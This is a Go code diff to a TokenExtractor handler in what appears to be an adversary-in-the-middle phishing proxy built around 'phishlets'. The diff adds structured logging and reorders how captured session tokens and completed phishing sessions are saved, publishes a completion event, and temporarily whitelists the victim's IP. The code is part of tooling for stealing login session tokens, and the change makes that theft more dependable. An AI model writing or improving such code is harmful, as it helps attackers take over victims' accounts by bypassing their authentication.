@@ -1,6 +1,7 @@
 package response
 
 import (
+	"log/slog"
 	"net/http"
 	"strings"
 	"time"
@@ -35,6 +36,7 @@ type TokenExtractor struct {
 	Bus       eventPublisher
 	Completer SessionCompleter
 	Whitelist TemporaryWhitelister // may be nil
+	Logger    *slog.Logger
 }
 
 func (h *TokenExtractor) Name() string { return "TokenExtractor" }
@@ -52,16 +54,19 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 			updated = h.extractHeaderToken(ctx, resp, rule) || updated
 		}
 	}
-	if updated {
-		_ = h.Store.UpdateSession(ctx.Session)
-	}
 	if !ctx.Session.IsDone() && h.Completer.IsComplete(ctx.Session, ctx.Phishlet) {
 		completedAt := time.Now()
 		ctx.Session.CompletedAt = &completedAt
-		_ = h.Store.UpdateSession(ctx.Session)
+		if err := h.Store.UpdateSession(ctx.Session); err != nil {
+			h.Logger.Warn("failed to persist session completion", "session_id", ctx.Session.ID, "error", err)
+		}
 		h.Bus.Publish(aitm.Event{Type: aitm.EventSessionCompleted, Payload: ctx.Session})
 		if h.Whitelist != nil {
 			h.Whitelist.WhitelistTemporary(ctx.ClientIP, 10*time.Minute)
+		}
+	} else if updated {
+		if err := h.Store.UpdateSession(ctx.Session); err != nil {
+			h.Logger.Warn("failed to persist captured tokens", "session_id", ctx.Session.ID, "error", err)
 		}
 	}
 	return nil
